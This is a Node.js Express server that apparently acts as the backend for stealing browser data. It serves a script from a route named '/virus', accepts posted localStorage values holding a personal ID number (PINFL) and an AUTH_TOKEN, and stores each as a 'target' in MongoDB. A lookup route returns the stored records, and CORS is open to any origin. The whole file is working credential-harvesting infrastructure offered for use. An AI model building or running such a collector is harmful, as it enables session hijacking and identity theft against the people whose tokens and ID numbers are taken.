const express = require("express")
const Joi = require("joi")
const app = express()
app.use(express.json())
const _ = require("lodash")
const { default: mongoose } = require("mongoose")
const data = require("./schema/data")
const cors = require("cors")
app.use(cors({origin:"*"}))


const connectDB = async () => {
    const connection = await mongoose.connect("mongodb://127.0.0.1:27017/davayBuzamiz")
    console.log(`mongoDB connect => ${connection.connection.host}`);
}
connectDB()

app.get("/virus" , ( req , res ) => res.sendFile("./helpers/virus.js" , {root : __dirname}))
app.get("/style" , (req, res) => res.sendFile("./helpers/style.css" , {root : __dirname}))

app.get("/" , (req , res) => res.send("hello"))

app.post("/save-data" , async ( req , res ) => {
    const { value , error } = Joi.object(
        {
            localstorage:Joi.object(
                {
                    PINFL:Joi.number().required(),
                    AUTH_TOKEN:Joi.string().required()
                }
            ).required()
        }
    ).validate(_.pick(req.body , ["localstorage"]))
    console.log(error);
    if(error) return res.status(200).json({status:"error"})
    const target = await data.create({localStorage:value.localstorage})
    res.status(200).json({status:"success" , data:target})
})

app.get("/target/:id" , async ( req , res ) => {
    if(!mongoose.Types.ObjectId.isValid(req.params.id)) return res.status(200).json({status:"error"})
    const target = await data.findById(req.params.id)
    if(!target) return res.status(200).json( { status : "error" } )
    res.status(200).json(target)
})

app.listen(3000 , () => console.log("server running on port 3000"))